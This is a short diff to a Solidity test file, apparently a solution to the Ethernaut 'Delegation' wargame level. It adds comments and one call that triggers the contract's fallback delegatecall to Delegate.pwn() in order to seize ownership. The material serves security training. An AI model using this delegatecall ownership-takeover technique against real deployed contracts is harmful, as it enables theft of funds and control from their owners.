@@ -29,6 +29,11 @@ contract DelegationTest is Test {
         // LEVEL ATTACK //
         //////////////////
 
+        // Delegation will delegatecall to Delegate through the fallback
+        // It will modiy the storage of the Delegation contract
+        // By call pwn through the fallback, it allows to gain ownership of Delegation
+        address(ethernautDelegation).call(abi.encodeCall(Delegate.pwn, ()));
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
